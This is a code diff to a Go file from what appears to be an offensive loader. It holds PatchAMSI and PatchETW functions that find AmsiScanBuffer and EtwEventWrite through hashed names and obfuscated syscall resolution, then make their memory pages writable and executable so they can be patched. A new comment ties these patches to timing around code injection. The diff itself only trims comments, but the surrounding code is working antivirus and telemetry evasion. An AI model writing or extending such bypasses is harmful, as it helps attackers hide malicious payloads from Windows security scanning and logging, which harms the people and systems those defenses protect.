@@ -9,14 +9,14 @@ import (
 )
 
 func PatchAMSI() error {
-	// 1. Get the base address of amsi.dll using existing codebase methods
+	// 1. Get the base address of amsi.dll
 	amsiHash := obf.GetHash("amsi.dll")
 	amsiBase := syscallresolve.GetModuleBase(amsiHash)
 	if amsiBase == 0 {
 		return fmt.Errorf("amsi.dll not found (not loaded)")
 	}
 
-	// 2. Get the address of AmsiScanBuffer using existing PE parsing
+	// 2. Get the address of AmsiScanBuffer
 	functionHash := obf.GetHash("AmsiScanBuffer")
 	procAddr := syscallresolve.GetFunctionAddress(amsiBase, functionHash)
 	if procAddr == 0 {
@@ -24,7 +24,7 @@ func PatchAMSI() error {
 	}
 
 	// 3. Change protection to RWX for that page
-	//    Use the "current process" pseudo‐handle (–1 or 0xFFFFFFFFFFFFFFFF).
+	//    Use the "current process" pseudo‐handle (–1 or 0xFFFFFFFFFFFFFFFF)
 	const (
 		currentProcess      = ^uintptr(0)  // (ULONG_PTR)(-1)
 		PAGE_EXEC_READWRITE = 0x40         // PAGE_EXECUTE_READWRITE
@@ -67,14 +67,14 @@ func PatchAMSI() error {
 }
 
 func PatchETW() error {
-	// 1. Get the base address of ntdll.dll using existing codebase methods
+	// 1. Get the base address of ntdll.dll
 	ntdllHash := obf.GetHash("ntdll.dll")
 	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
 	if ntdllBase == 0 {
 		return fmt.Errorf("ntdll.dll not found")
 	}
 
-	// 2. Get the address of EtwEventWrite using existing PE parsing
+	// 2. Get the address of EtwEventWrite
 	functionHash := obf.GetHash("EtwEventWrite")
 	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
 	if procAddr == 0 {
@@ -381,6 +381,7 @@ func ApplyAllPatches() (successful []string, failed map[string]error) {
 }
 
 // ApplyCriticalPatches applies only the most important patches (AMSI and ETW)
+// These are the safest to apply pre injection post allocation, sometimes ETW will interfere with mem allocation for god knows why
 func ApplyCriticalPatches() (successful []string, failed map[string]error) {
 	successful = make([]string, 0)
 	failed = make(map[string]error)
